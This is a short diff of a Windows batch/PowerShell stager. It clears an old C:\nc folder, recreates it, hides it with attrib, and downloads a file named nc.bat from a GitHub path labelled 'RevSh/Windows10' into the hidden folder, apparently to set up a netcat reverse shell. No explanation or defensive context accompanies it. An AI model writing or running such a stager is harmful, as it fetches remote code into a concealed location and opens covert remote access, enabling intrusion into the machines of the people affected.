@@ -1,3 +1,5 @@
+cmd /c "del C:\nc /q"
+cmd /c "rmdir C:\nc"
 cmd /c "md C:\nc"
 cmd /c "attrib +h C:\nc"
 (new-object System.Net.WebClient).Downloadfile("https://raw.githubusercontent.com/7ext34/7ext-34/master/RevSh/Windows10/nc.bat","C:\nc\nc.bat")
